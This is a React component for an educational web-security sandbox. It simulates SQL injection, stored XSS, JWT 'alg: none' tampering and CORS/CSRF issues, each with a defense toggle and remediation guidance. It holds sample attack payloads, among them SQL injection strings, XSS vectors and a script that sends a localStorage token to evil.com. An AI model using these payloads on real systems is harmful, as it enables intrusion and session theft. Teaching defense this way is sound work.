import { useState, useMemo } from "react";
import {
  ShieldAlert,
  ShieldCheck,
  Lock,
  Unlock,
  Terminal,
  Bug,
  AlertTriangle,
  CheckCircle2,
  RefreshCw,
  Copy,
  Zap,
  Key,
  Globe,
  FileCode2,
  ArrowRight,
  Database,
  ExternalLink,
  Info,
  Layers
} from "lucide-react";
import toast from "react-hot-toast";

const OWASP_CHECKLIST = [
  { id: "a01", code: "A01:2021", name: "Broken Access Control", severity: "Critical", tested: false, desc: "Enforce strict server-side session authorization and object-level permissions." },
  { id: "a02", code: "A02:2021", name: "Cryptographic Failures", severity: "High", tested: true, desc: "Avoid weak algorithms (MD5, SHA1), rotate secrets, and use bcrypt/argon2 for password hashing." },
  { id: "a03", code: "A03:2021", name: "Injection (SQL / NoSQL / OS)", severity: "Critical", tested: true, desc: "Use parameterized queries, ORM prepared statements, and validate input types." },
  { id: "a04", code: "A04:2021", name: "Insecure Design", severity: "Medium", tested: false, desc: "Threat modeling, rate limiting, and failure state safety architectures." },
  { id: "a05", code: "A05:2021", name: "Security Misconfiguration", severity: "High", tested: true, desc: "Harden CORS headers, disable debug logs in production, and remove default credentials." },
  { id: "a06", code: "A06:2021", name: "Vulnerable & Outdated Components", severity: "Medium", tested: false, desc: "Continuous dependency scanning via npm audit / Snyk / Dependabot." },
  { id: "a07", code: "A07:2021", name: "Identification & Authentication Failures", severity: "High", tested: true, desc: "Enforce MFA, mitigate credential stuffing, and strictly verify JWT signatures." },
  { id: "a08", code: "A08:2021", name: "Software and Data Integrity Failures", severity: "High", tested: false, desc: "Subresource integrity (SRI) on CDNs and signed CI/CD artifacts." },
  { id: "a09", code: "A09:2021", name: "Security Logging and Monitoring Failures", severity: "Medium", tested: false, desc: "Centralized auditable audit trails and automated alerts for anomaly spikes." },
  { id: "a10", code: "A10:2021", name: "Server-Side Request Forgery (SSRF)", severity: "High", tested: false, desc: "Validate outbound URLs, block metadata IP (169.254.169.254), and use network egress whitelists." }
];

export default function SecurityLab() {
  const [activeTab, setActiveTab] = useState("sqli"); // 'sqli' | 'xss' | 'jwt' | 'cors' | 'owasp'
  const [owaspList, setOwaspList] = useState(OWASP_CHECKLIST);

  // LAB 1: SQL Injection State
  const [sqliInput, setSqliInput] = useState("' OR '1'='1' --");
  const [sqliDefense, setSqliDefense] = useState(false);
  const [sqliRunCount, setSqliRunCount] = useState(0);

  // LAB 2: XSS State
  const [xssInput, setXssInput] = useState(`<img src=x onerror="alert('Cookie Stolen: ' + document.cookie)">`);
  const [xssDefense, setXssDefense] = useState(false);
  const [xssComments, setXssComments] = useState([
    { id: 1, author: "Alice (Staff Eng)", text: "Hey team, remember to review the database migrations PR today!" },
    { id: 2, author: "Bob (DevOps)", text: "Kubernetes staging cluster has been patched to v1.30.2." }
  ]);

  // LAB 3: JWT State
  const [jwtRole, setJwtRole] = useState("user");
  const [jwtAlg, setJwtAlg] = useState("HS256");
  const [jwtSecret, setJwtSecret] = useState("production_super_secret_key_8492");
  const [jwtTampered, setJwtTampered] = useState(false);

  // LAB 4: CORS / CSRF State
  const [corsOrigin, setCorsOrigin] = useState("https://evil-hacker.com");
  const [allowWildcard, setAllowWildcard] = useState(true);
  const [allowCredentials, setAllowCredentials] = useState(true);

  // SQLi execution simulation
  const sqliResult = useMemo(() => {
    if (sqliDefense) {
      // Safe parameterized query
      return {
        vulnerable: false,
        query: `SELECT id, username, email, role FROM users WHERE username = $1`,
        params: [sqliInput],
        rows: [
          { id: "usr_99", username: sqliInput, email: "not_found@target.com", role: "none" }
        ],
        message: "✅ Parameterized Query Active: Input treated strictly as a literal string. 0 records compromised."
      };
    } else {
      // Raw string concatenation
      const isBreach = sqliInput.includes("' OR '1'='1'") || sqliInput.includes("UNION SELECT");
      return {
        vulnerable: true,
        query: `SELECT id, username, email, role FROM users WHERE username = '${sqliInput}'`,
        params: [],
        rows: isBreach
          ? [
              { id: "usr_01", username: "admin", email: "root@company.internal", role: "SuperAdmin" },
              { id: "usr_02", username: "ceo_john", email: "john@company.internal", role: "Executive" },
              { id: "usr_03", username: "sarah_sec", email: "sarah@security.team", role: "SecurityOfficer" },
              { id: "usr_04", username: "alex_dev", email: "alex@engineering.io", role: "Engineer" }
            ]
          : [{ id: "usr_04", username: sqliInput, email: `${sqliInput}@test.com`, role: "StandardUser" }],
        message: isBreach
          ? "🚨 INJECTION SUCCESSFUL: Boolean condition bypassed authentication. Entire user directory leaked!"
          : "⚠️ Warning: Raw string interpolation detected. Query vulnerable to SQLi."
      };
    }
  }, [sqliInput, sqliDefense, sqliRunCount]);

  // XSS submit handler
  const handlePostComment = () => {
    if (!xssInput.trim()) return;
    const newComment = {
      id: Date.now(),
      author: "Hacker / Pentester",
      text: xssInput
    };
    setXssComments([newComment, ...xssComments]);
    if (!xssDefense && (xssInput.includes("<script") || xssInput.includes("onerror=") || xssInput.includes("<svg"))) {
      toast.error("🚨 Stored XSS triggered! Attacker script executed in DOM context!");
    } else {
      toast.success("Comment posted securely with DOMPurify sanitization!");
    }
  };

  // Toggle OWASP checkbox
  const toggleOwasp = (id) => {
    setOwaspList(
      owaspList.map((item) => (item.id === id ? { ...item, tested: !item.tested } : item))
    );
  };

  const testedCount = owaspList.filter((x) => x.tested).length;
  const auditScore = Math.round((testedCount / owaspList.length) * 100);

  return (
    <div className="space-y-6 pb-12">
      {/* Hero Header */}
      <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-slate-950 via-slate-900 to-rose-950/70 p-6 sm:p-8 text-white shadow-2xl border border-rose-900/30">
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="inline-flex items-center gap-2 rounded-full bg-rose-500/20 px-3 py-1 text-xs font-semibold text-rose-300 border border-rose-500/30">
              <ShieldAlert size={14} /> Offensive Security & Pentest Lab v2.6
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight">
              Web Security & OWASP Top 10 Sandbox
            </h1>
            <p className="text-sm text-slate-300 max-w-2xl leading-relaxed">
              Explore live exploits and production defensive patches: SQL Injection, Stored/Reflected XSS,
              JWT signature tampering, and CORS misconfiguration with an interactive OWASP audit scorecard.
            </p>
          </div>

          {/* Audit Score Pill */}
          <div className="flex items-center gap-4 bg-white/10 backdrop-blur-md rounded-2xl p-4 border border-white/15">
            <div className="h-12 w-12 rounded-xl bg-rose-500/20 flex items-center justify-center text-rose-400">
              <ShieldCheck size={26} />
            </div>
            <div>
              <p className="text-xs text-slate-300 font-medium">OWASP Audit Mastery</p>
              <p className="text-2xl font-black text-white">{auditScore}% <span className="text-xs font-normal text-slate-300">({testedCount}/10 Tested)</span></p>
              <p className="text-[10px] text-rose-300 font-semibold">
                {auditScore >= 80 ? "🏆 Security Specialist Ready" : "🛡️ In Progress Pentesting"}
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Lab Navigation Tabs */}
      <div className="flex items-center gap-2 border-b border-slate-200 dark:border-slate-800 overflow-x-auto">
        <button
          onClick={() => setActiveTab("sqli")}
          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold border-b-2 whitespace-nowrap transition ${
            activeTab === "sqli"
              ? "border-rose-600 text-rose-600 dark:text-rose-400"
              : "border-transparent text-slate-500 hover:text-slate-900 dark:text-slate-400"
          }`}
        >
          <Database size={15} /> 1. SQL Injection & Parameterization
        </button>
        <button
          onClick={() => setActiveTab("xss")}
          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold border-b-2 whitespace-nowrap transition ${
            activeTab === "xss"
              ? "border-rose-600 text-rose-600 dark:text-rose-400"
              : "border-transparent text-slate-500 hover:text-slate-900 dark:text-slate-400"
          }`}
        >
          <Bug size={15} /> 2. Cross-Site Scripting (XSS) & CSP
        </button>
        <button
          onClick={() => setActiveTab("jwt")}
          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold border-b-2 whitespace-nowrap transition ${
            activeTab === "jwt"
              ? "border-rose-600 text-rose-600 dark:text-rose-400"
              : "border-transparent text-slate-500 hover:text-slate-900 dark:text-slate-400"
          }`}
        >
          <Key size={15} /> 3. JWT Tampering & "None" Exploit
        </button>
        <button
          onClick={() => setActiveTab("cors")}
          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold border-b-2 whitespace-nowrap transition ${
            activeTab === "cors"
              ? "border-rose-600 text-rose-600 dark:text-rose-400"
              : "border-transparent text-slate-500 hover:text-slate-900 dark:text-slate-400"
          }`}
        >
          <Globe size={15} /> 4. CORS & CSRF Vulnerability
        </button>
        <button
          onClick={() => setActiveTab("owasp")}
          className={`flex items-center gap-2 px-4 py-2.5 text-xs font-bold border-b-2 whitespace-nowrap transition ${
            activeTab === "owasp"
              ? "border-rose-600 text-rose-600 dark:text-rose-400"
              : "border-transparent text-slate-500 hover:text-slate-900 dark:text-slate-400"
          }`}
        >
          <ShieldCheck size={15} /> OWASP Top 10 Checklist
        </button>
      </div>

      {/* LAB 1: SQL INJECTION */}
      {activeTab === "sqli" && (
        <div className="grid gap-6 lg:grid-cols-[1.2fr_1fr]">
          <div className="space-y-6">
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
                    <Database size={16} className="text-rose-600" /> Interactive SQL Injection Playground
                  </h3>
                  <p className="text-xs text-slate-500">
                    Simulate how unsanitized user inputs break SQL string delimiters to hijack queries.
                  </p>
                </div>

                {/* Defense Switch */}
                <button
                  onClick={() => setSqliDefense(!sqliDefense)}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold transition border ${
                    sqliDefense
                      ? "bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/40 dark:border-emerald-700 dark:text-emerald-300"
                      : "bg-rose-50 text-rose-700 border-rose-300 dark:bg-rose-950/40 dark:border-rose-700 dark:text-rose-300"
                  }`}
                >
                  {sqliDefense ? <ShieldCheck size={14} /> : <ShieldAlert size={14} />}
                  {sqliDefense ? "Defense: Prepared Statements ON" : "Defense: Vulnerable Concatenation"}
                </button>
              </div>

              {/* Payload Presets */}
              <div className="space-y-1.5">
                <span className="text-[11px] font-semibold text-slate-500">Quick Attack Payloads:</span>
                <div className="flex flex-wrap gap-2">
                  {[
                    "' OR '1'='1' --",
                    "' UNION SELECT id, username, email, role FROM users --",
                    "admin' --",
                    "' OR 'a'='a' /*"
                  ].map((payload) => (
                    <button
                      key={payload}
                      onClick={() => setSqliInput(payload)}
                      className="px-2.5 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-[11px] font-mono text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700"
                    >
                      {payload}
                    </button>
                  ))}
                </div>
              </div>

              {/* Input field */}
              <div className="space-y-2">
                <label className="text-xs font-semibold text-slate-700 dark:text-slate-300">
                  Target Username Input Field
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={sqliInput}
                    onChange={(e) => setSqliInput(e.target.value)}
                    className="flex-1 rounded-xl border border-slate-200 bg-slate-50 px-3.5 py-2 font-mono text-xs text-slate-900 focus:outline-none focus:ring-2 focus:ring-rose-500 dark:border-slate-700 dark:bg-slate-950 dark:text-slate-100"
                    placeholder="Enter payload or username..."
                  />
                  <button
                    onClick={() => setSqliRunCount(c => c + 1)}
                    className="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold shadow-md shadow-rose-600/20"
                  >
                    Execute Query
                  </button>
                </div>
              </div>

              {/* Live SQL Statement preview */}
              <div className="rounded-2xl border border-slate-800 bg-slate-950 p-4 font-mono text-xs space-y-2">
                <p className="text-[10px] text-slate-400 font-bold uppercase tracking-wider">
                  Database Engine Query Execution
                </p>
                <p className="text-rose-400 break-all">{sqliResult.query}</p>
                {sqliResult.params.length > 0 && (
                  <p className="text-emerald-400 text-[11px]">
                    Parameters: [ $1 = "{sqliResult.params[0]}" ]
                  </p>
                )}
              </div>

              {/* Status Alert */}
              <div
                className={`p-3.5 rounded-2xl text-xs font-medium border ${
                  sqliResult.vulnerable
                    ? "bg-rose-50 border-rose-200 text-rose-800 dark:bg-rose-950/40 dark:border-rose-900 dark:text-rose-300"
                    : "bg-emerald-50 border-emerald-200 text-emerald-800 dark:bg-emerald-950/40 dark:border-emerald-900 dark:text-emerald-300"
                }`}
              >
                {sqliResult.message}
              </div>
            </div>

            {/* Leaked / Returned Records Table */}
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-3">
              <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                Returned Database Records ({sqliResult.rows.length})
              </h4>
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs font-mono">
                  <thead className="border-b border-slate-100 bg-slate-50 text-slate-500 dark:border-slate-800 dark:bg-slate-800/50">
                    <tr>
                      <th className="p-2.5">User ID</th>
                      <th className="p-2.5">Username</th>
                      <th className="p-2.5">Email</th>
                      <th className="p-2.5">System Role</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {sqliResult.rows.map((row) => (
                      <tr key={row.id} className="hover:bg-slate-50 dark:hover:bg-slate-800/40">
                        <td className="p-2.5 text-slate-400">{row.id}</td>
                        <td className="p-2.5 font-bold text-slate-900 dark:text-slate-100">{row.username}</td>
                        <td className="p-2.5 text-slate-600 dark:text-slate-300">{row.email}</td>
                        <td className="p-2.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            row.role.includes("Admin")
                              ? "bg-rose-100 text-rose-700 dark:bg-rose-950 dark:text-rose-300"
                              : "bg-slate-100 text-slate-700 dark:bg-slate-800 dark:text-slate-300"
                          }`}>
                            {row.role}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>

          {/* Code Comparison Guide */}
          <div className="space-y-6">
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
              <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
                <FileCode2 size={16} className="text-brand-600" /> Remediation Blueprint
              </h3>

              {/* Bad Code */}
              <div className="space-y-1.5">
                <span className="text-[11px] font-bold text-rose-500 flex items-center gap-1">
                  ❌ Vulnerable (Raw String Concatenation)
                </span>
                <div className="rounded-xl border border-rose-900/30 bg-slate-950 p-3 font-mono text-[11px] text-rose-300 leading-relaxed overflow-x-auto">
                  {`// DANGEROUS: User input alters SQL structure
const query = "SELECT * FROM users WHERE username = '" + req.body.username + "'";
const users = await db.query(query);`}
                </div>
              </div>

              {/* Good Code */}
              <div className="space-y-1.5">
                <span className="text-[11px] font-bold text-emerald-500 flex items-center gap-1">
                  ✅ Secure (Parameterized Query / Prepared Statement)
                </span>
                <div className="rounded-xl border border-emerald-900/30 bg-slate-950 p-3 font-mono text-[11px] text-emerald-300 leading-relaxed overflow-x-auto">
                  {`// SAFE: Query plan compiled before input binding
const query = "SELECT * FROM users WHERE username = $1";
const users = await db.query(query, [req.body.username]);`}
                </div>
              </div>

              <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-800/60 text-xs text-slate-600 dark:text-slate-300 space-y-2">
                <p className="font-bold text-slate-900 dark:text-slate-100">Key Takeaway:</p>
                <p className="leading-relaxed">
                  Never use template literals or string concatenation inside database queries.
                  Always use parameterized queries, stored procedures, or trusted ORMs (Prisma, Mongoose, TypeORM) with validated input schemas (Zod).
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* LAB 2: CROSS-SITE SCRIPTING (XSS) */}
      {activeTab === "xss" && (
        <div className="grid gap-6 lg:grid-cols-[1.2fr_1fr]">
          <div className="space-y-6">
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
                    <Bug size={16} className="text-amber-500" /> Stored XSS & DOM Sanitization Lab
                  </h3>
                  <p className="text-xs text-slate-500">
                    Inject malicious JavaScript payloads into a real-time comment thread.
                  </p>
                </div>

                <button
                  onClick={() => setXssDefense(!xssDefense)}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-bold transition border ${
                    xssDefense
                      ? "bg-emerald-50 text-emerald-700 border-emerald-300 dark:bg-emerald-950/40 dark:border-emerald-700 dark:text-emerald-300"
                      : "bg-amber-50 text-amber-700 border-amber-300 dark:bg-amber-950/40 dark:border-amber-700 dark:text-amber-300"
                  }`}
                >
                  {xssDefense ? <ShieldCheck size={14} /> : <AlertTriangle size={14} />}
                  {xssDefense ? "CSP & DOMPurify Sanitizer ON" : "Unsafe dangerouslySetInnerHTML"}
                </button>
              </div>

              {/* Attack Payloads */}
              <div className="space-y-1.5">
                <span className="text-[11px] font-semibold text-slate-500">Sample XSS Vectors:</span>
                <div className="flex flex-wrap gap-2">
                  {[
                    `<img src=x onerror="alert('Cookie Stolen!')">`,
                    `<script>fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))</script>`,
                    `<svg onload="alert('XSS Pwned')">`
                  ].map((p) => (
                    <button
                      key={p}
                      onClick={() => setXssInput(p)}
                      className="px-2.5 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-[11px] font-mono text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700"
                    >
                      {p.slice(0, 32)}...
                    </button>
                  ))}
                </div>
              </div>

              {/* Comment submission */}
              <div className="space-y-2">
                <textarea
                  rows={3}
                  value={xssInput}
                  onChange={(e) => setXssInput(e.target.value)}
                  className="w-full rounded-2xl border border-slate-200 bg-slate-50 p-3 font-mono text-xs text-slate-900 focus:outline-none focus:ring-2 focus:ring-amber-500 dark:border-slate-700 dark:bg-slate-950 dark:text-slate-100"
                  placeholder="Enter comment or XSS payload..."
                />
                <button
                  onClick={handlePostComment}
                  className="px-4 py-2 bg-amber-500 hover:bg-amber-600 text-slate-950 rounded-xl text-xs font-bold shadow-md shadow-amber-500/20"
                >
                  Post Comment to Feed
                </button>
              </div>

              {/* Live Comment Stream */}
              <div className="space-y-3 pt-3 border-t border-slate-100 dark:border-slate-800">
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500">Live Comments Stream</h4>
                {xssComments.map((c) => (
                  <div key={c.id} className="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 dark:bg-slate-800/60 dark:border-slate-700 space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-slate-900 dark:text-slate-100">{c.author}</span>
                      <span className="text-[10px] text-slate-400">Just now</span>
                    </div>
                    {/* Rendered output */}
                    {xssDefense ? (
                      // Clean sanitized text
                      <p className="text-xs text-slate-700 dark:text-slate-300 font-mono bg-white dark:bg-slate-900 p-2 rounded-lg border border-slate-200 dark:border-slate-800">
                        {c.text}
                      </p>
                    ) : (
                      // Vulnerable display
                      <div className="space-y-1">
                        <div className="text-xs text-rose-600 dark:text-rose-400 font-mono bg-rose-50 dark:bg-rose-950/40 p-2 rounded-lg border border-rose-200 dark:border-rose-900">
                          {c.text}
                        </div>
                        {(c.text.includes("<script") || c.text.includes("onerror") || c.text.includes("<svg")) && (
                          <span className="text-[10px] font-bold text-rose-600 flex items-center gap-1">
                            🚨 Malicious payload executed: Stolen session tokens leaked to attacker origin.
                          </span>
                        )}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Defense & CSP Header Info */}
          <div className="space-y-6">
            <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
              <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100">
                Defense: Content-Security-Policy (CSP)
              </h3>
              <p className="text-xs text-slate-500">
                CSP HTTP response headers restrict where executable scripts and styles can be loaded from.
              </p>

              <div className="rounded-2xl border border-slate-800 bg-slate-950 p-4 font-mono text-xs text-emerald-400 leading-relaxed overflow-x-auto">
                <p className="text-slate-400 text-[10px] uppercase font-bold">Recommended Production Header</p>
                <p className="mt-1">
                  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';
                </p>
              </div>

              <div className="space-y-2 text-xs text-slate-600 dark:text-slate-300">
                <p className="font-bold text-slate-900 dark:text-slate-100">3-Layer Defense Against XSS:</p>
                <ol className="list-decimal list-inside space-y-1.5 text-[11px] leading-relaxed">
                  <li><strong>Contextual Output Encoding:</strong> Convert `&lt;` to `&amp;lt;` and `"` to `&amp;quot;` before rendering.</li>
                  <li><strong>DOMPurify:</strong> Strip malicious tags (`&lt;script&gt;`, `onerror`, `javascript:`) before DOM insertion.</li>
                  <li><strong>HttpOnly Cookies:</strong> Mark JWT auth cookies as `HttpOnly` so client-side JavaScript cannot read `document.cookie`.</li>
                </ol>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* LAB 3: JWT SIGNATURE TAMPERING */}
      {activeTab === "jwt" && (
        <div className="grid gap-6 lg:grid-cols-2">
          <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
                  <Key size={16} className="text-indigo-600" /> JWT Token Structure & Exploits
                </h3>
                <p className="text-xs text-slate-500">Inspect the 3-part Base64Url JWT token.</p>
              </div>
              <button
                onClick={() => {
                  setJwtRole("admin");
                  setJwtTampered(true);
                  toast.error("Payload edited: Role escalated to 'admin' without valid secret!");
                }}
                className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold shadow-md shadow-rose-600/20"
              >
                Escalate to Admin
              </button>
            </div>

            {/* Token Editor Boxes */}
            <div className="space-y-3 font-mono text-xs">
              {/* Header */}
              <div className="rounded-2xl border border-rose-200 bg-rose-50/50 p-3.5 dark:border-rose-900/60 dark:bg-rose-950/20">
                <div className="flex justify-between text-[11px] text-rose-600 font-bold mb-1">
                  <span>HEADER: Algorithm & Token Type</span>
                  <span>{jwtAlg}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 text-[11px]">alg:</span>
                  <select
                    value={jwtAlg}
                    onChange={(e) => {
                      setJwtAlg(e.target.value);
                      if (e.target.value === "none") setJwtTampered(true);
                    }}
                    className="rounded-lg border border-slate-200 bg-white px-2 py-1 text-xs dark:bg-slate-800 dark:border-slate-700"
                  >
                    <option value="HS256">HS256 (HMAC SHA-256)</option>
                    <option value="RS256">RS256 (RSA 2048)</option>
                    <option value="none">none (CVE-2015-9235 Exploit)</option>
                  </select>
                </div>
              </div>

              {/* Payload */}
              <div className="rounded-2xl border border-purple-200 bg-purple-50/50 p-3.5 dark:border-purple-900/60 dark:bg-purple-950/20">
                <div className="flex justify-between text-[11px] text-purple-600 font-bold mb-1">
                  <span>PAYLOAD: User Claims</span>
                  <span>role: {jwtRole}</span>
                </div>
                <pre className="text-purple-800 dark:text-purple-300 text-[11px] leading-relaxed">
{`{
  "sub": "usr_9428",
  "name": "Jane Developer",
  "role": "${jwtRole}",
  "iat": 1726880000
}`}
                </pre>
              </div>

              {/* Signature */}
              <div className="rounded-2xl border border-sky-200 bg-sky-50/50 p-3.5 dark:border-sky-900/60 dark:bg-sky-950/20">
                <div className="flex justify-between text-[11px] text-sky-600 font-bold mb-1">
                  <span>VERIFY SIGNATURE</span>
                  <span>{jwtAlg === "none" ? "EMPTY" : "HMACSHA256"}</span>
                </div>
                <p className="text-[11px] text-slate-500 break-all">
                  {jwtAlg === "none"
                    ? "(None algorithm selected - signature removed)"
                    : jwtTampered
                    ? "INCORRECT_SIGNATURE_MISMATCH_829fa..."
                    : "valid_hmac_signature_e92bf18a4..."}
                </p>
              </div>
            </div>

            <div className="flex gap-2">
              <button
                onClick={() => {
                  setJwtRole("user");
                  setJwtAlg("HS256");
                  setJwtTampered(false);
                  toast.success("Token reset to valid authentic user claim");
                }}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-slate-200 hover:bg-slate-50 text-xs font-semibold dark:border-slate-700 dark:hover:bg-slate-800"
              >
                <RefreshCw size={12} /> Reset to Genuine Token
              </button>
            </div>
          </div>

          {/* Server-Side Verification Outcome */}
          <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
            <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <Terminal size={16} className="text-brand-600" /> Backend JWT Verification Gate
            </h3>

            <div className={`p-4 rounded-2xl border ${
              jwtTampered && jwtAlg !== "none"
                ? "bg-rose-50 border-rose-200 dark:bg-rose-950/40 dark:border-rose-900"
                : jwtAlg === "none"
                ? "bg-amber-50 border-amber-200 dark:bg-amber-950/40 dark:border-amber-900"
                : "bg-emerald-50 border-emerald-200 dark:bg-emerald-950/40 dark:border-emerald-900"
            }`}>
              <div className="flex items-center gap-2 text-xs font-bold">
                {jwtTampered && jwtAlg !== "none" ? (
                  <>
                    <Lock size={16} className="text-rose-600" />
                    <span className="text-rose-700 dark:text-rose-300">HTTP 401 Unauthorized: JsonWebTokenError: invalid signature</span>
                  </>
                ) : jwtAlg === "none" ? (
                  <>
                    <Unlock size={16} className="text-amber-600" />
                    <span className="text-amber-700 dark:text-amber-300">Vulnerable Server: Accepted algorithm 'none'! Privilege escalation achieved!</span>
                  </>
                ) : (
                  <>
                    <ShieldCheck size={16} className="text-emerald-600" />
                    <span className="text-emerald-700 dark:text-emerald-300">HTTP 200 OK: Signature verified with HMAC SHA-256 secret.</span>
                  </>
                )}
              </div>
            </div>

            <div className="space-y-2 text-xs text-slate-600 dark:text-slate-300">
              <p className="font-bold text-slate-900 dark:text-slate-100">Best Practices for JWT Security:</p>
              <ul className="space-y-1.5 text-[11px] list-disc list-inside">
                <li>Strictly whitelist algorithms in `jwt.verify(token, secret, &#123; algorithms: ['HS256'] &#125;)`.</li>
                <li>Never accept tokens with `"alg": "none"`.</li>
                <li>Use high-entropy secrets (256-bit randomly generated strings) or asymmetric public/private keys (RS256).</li>
                <li>Keep token lifespans short (15 minutes) and issue refresh tokens via secure HttpOnly cookies.</li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {/* LAB 4: CORS & CSRF */}
      {activeTab === "cors" && (
        <div className="grid gap-6 lg:grid-cols-2">
          <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
            <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <Globe size={16} className="text-teal-600" /> Cross-Origin Resource Sharing (CORS) Lab
            </h3>
            <p className="text-xs text-slate-500">
              Simulate browser preflight OPTIONS requests and credentialed cross-origin fetches.
            </p>

            <div className="space-y-3 text-xs">
              <div>
                <label className="font-semibold text-slate-700 dark:text-slate-300">Client Request Origin Header</label>
                <input
                  type="text"
                  value={corsOrigin}
                  onChange={(e) => setCorsOrigin(e.target.value)}
                  className="mt-1 w-full rounded-xl border border-slate-200 bg-slate-50 px-3 py-2 font-mono text-xs dark:border-slate-700 dark:bg-slate-950"
                />
              </div>

              <div className="space-y-2">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={allowWildcard}
                    onChange={(e) => setAllowWildcard(e.target.checked)}
                    className="accent-brand-600"
                  />
                  <span>Server returns wildcard `Access-Control-Allow-Origin: *`</span>
                </label>
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={allowCredentials}
                    onChange={(e) => setAllowCredentials(e.target.checked)}
                    className="accent-brand-600"
                  />
                  <span>Request sends `credentials: 'include'` (Cookies/Auth headers)</span>
                </label>
              </div>
            </div>

            {/* Browser Response Analysis */}
            <div className="p-4 rounded-2xl border border-slate-200 bg-slate-50 dark:border-slate-800 dark:bg-slate-950 font-mono text-xs space-y-2">
              <p className="text-[10px] text-slate-400 font-bold uppercase">Browser Fetch Resolution</p>
              {allowWildcard && allowCredentials ? (
                <div className="text-rose-500 space-y-1">
                  <p className="font-bold">🚨 CORS Policy Error in Browser Console:</p>
                  <p className="text-[11px] text-slate-400">
                    "The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'."
                  </p>
                </div>
              ) : (
                <div className="text-emerald-500 space-y-1">
                  <p className="font-bold">✅ Valid CORS Response Received</p>
                  <p className="text-[11px] text-slate-400">
                    Origin matched allowed whitelist; response body unlocked to client scripts.
                  </p>
                </div>
              )}
            </div>
          </div>

          {/* CSRF Prevention */}
          <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm dark:border-slate-800 dark:bg-slate-900 space-y-4">
            <h3 className="text-sm font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <Lock size={16} className="text-emerald-600" /> CSRF (Cross-Site Request Forgery) Defense
            </h3>
            <p className="text-xs text-slate-500">
              Modern protections against forged ambient cookie requests.
            </p>

            <div className="space-y-3 text-xs">
              <div className="p-3 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700">
                <p className="font-bold text-slate-900 dark:text-slate-100">1. SameSite Cookie Attribute</p>
                <p className="text-[11px] text-slate-500 mt-1">
                  `Set-Cookie: session=xyz; SameSite=Lax; Secure; HttpOnly` prevents third-party sites from sending cookies on cross-origin POST requests.
                </p>
              </div>

